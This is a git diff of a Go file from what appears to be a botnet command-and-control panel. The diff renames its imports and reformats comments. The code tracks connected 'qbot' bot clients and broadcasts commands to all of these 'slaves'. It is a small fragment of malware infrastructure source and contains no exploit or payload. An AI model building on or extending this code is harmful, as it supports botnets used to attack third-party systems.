@@ -1,9 +1,9 @@
 package qbot
 
 import (
-	"Nosviak2/core/sources/language/static"
-	"Nosviak2/core/sources/layouts/toml"
-	"Nosviak2/core/sources/tools"
+	"Morphine/core/sources/language/static"
+	"Morphine/core/sources/layouts/toml"
+	"Morphine/core/sources/tools"
 	"log"
 	"net"
 	"os"
@@ -12,31 +12,28 @@ import (
 	"time"
 )
 
-//stores config for qbot
-//allows us to broadcast better
+// stores config for qbot
+// allows us to broadcast better
 type QbotClient struct { //stored in structure
-	Name  string //name
+	Name  string      //name
 	Queue chan []byte //chan
-	Conn  net.Conn //connection
-	Key   int64 //map key
+	Conn  net.Conn    //connection
+	Key   int64       //map key
 }
 
 var (
 	QbotClients map[int64]*QbotClient = make(map[int64]*QbotClient) //stores all qbots
-	SyncMutex   sync.Mutex //syncs the information properly
+	SyncMutex   sync.Mutex                                          //syncs the information properly
 )
 
-
-//creates the client properly
-//this will ensure its done without errors
+// creates the client properly
+// this will ensure its done without errors
 func (Q *QbotClient) AddClient() {
 
 	SyncMutex.Lock()
 	defer SyncMutex.Unlock()
 	Q.Key = time.Now().UnixMicro()
 	QbotClients[Q.Key] = Q
-
-
 
 	//dynamic connection information has been set here
 	//this will ensure its done without errors happening
@@ -49,8 +46,8 @@ func (Q *QbotClient) AddClient() {
 	}
 }
 
-//creates the client properly
-//this will ensure its done without errors
+// creates the client properly
+// this will ensure its done without errors
 func (Q *QbotClient) RemoveClient() {
 
 	SyncMutex.Lock()
@@ -68,8 +65,8 @@ func (Q *QbotClient) RemoveClient() {
 	}
 }
 
-//broadcasts the message to all slaves
-//this will let me know of the message properly
+// broadcasts the message to all slaves
+// this will let me know of the message properly
 func Broadcast(b []byte) { //broadcasts properly
 	for _, slave := range QbotClients { //ranges
 		slave.Queue <- b
